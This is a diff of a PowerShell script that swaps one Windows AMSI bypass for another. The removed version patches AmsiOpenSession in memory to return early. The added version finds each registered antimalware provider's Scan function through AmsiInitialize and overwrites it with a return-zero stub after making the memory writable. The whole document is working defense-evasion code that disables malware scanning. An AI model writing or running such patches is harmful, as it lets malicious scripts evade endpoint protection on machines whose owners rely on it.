@@ -1,44 +1,36 @@
-function LookupFunc {
-
-	Param ($moduleName, $functionName)
-
-	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
-    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
-      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
-    $tmp=@()
-    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
-	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+$Apis = @"
+using System;
+using System.Runtime.InteropServices;
+public class Apis {
+  [DllImport("kernel32")]
+  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+  [DllImport("amsi")]
+  public static extern int AmsiInitialize(string appName, out Int64 context);
 }
+"@
+Add-Type $Apis
 
-function getDelegateType {
+$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
+$p = 0; $i = 0
+$SIZE_OF_PTR = 8
+[Int64]$ctx = 0
 
-	Param (
-		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
-		[Parameter(Position = 1)] [Type] $delType = [Void]
-	)
+[Apis]::AmsiInitialize("MyScanner", [ref]$ctx)
+$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$ctx, 16)
+$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64)
 
-	$type = [AppDomain]::CurrentDomain.
-    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
-    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
-      DefineDynamicModule('InMemoryModule', $false).
-      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
-      [System.MulticastDelegate])
+# Loop through all the providers
+while ($AntimalwareProvider -ne 0)
+{
+  # Find the provider's Scan function
+  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProvider)
+  $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)
 
-  $type.
-    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
-      SetImplementationFlags('Runtime, Managed')
-
-  $type.
-    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
-      SetImplementationFlags('Runtime, Managed')
-
-	return $type.CreateType()
+  # Patch the Scan function
+  Write-host "[$i] Provider's scan function found!" $AmsiProviderScanFunc
+  [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
+  [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, [IntPtr]$AmsiProviderScanFunc, 6)
+  
+  $i++
+  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$SIZE_OF_PTR))
 }
-
-[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
-$oldProtectionBuffer = 0
-$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
-$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
-$buf = [Byte[]] (0x48, 0x31, 0xC0) 
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
-$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
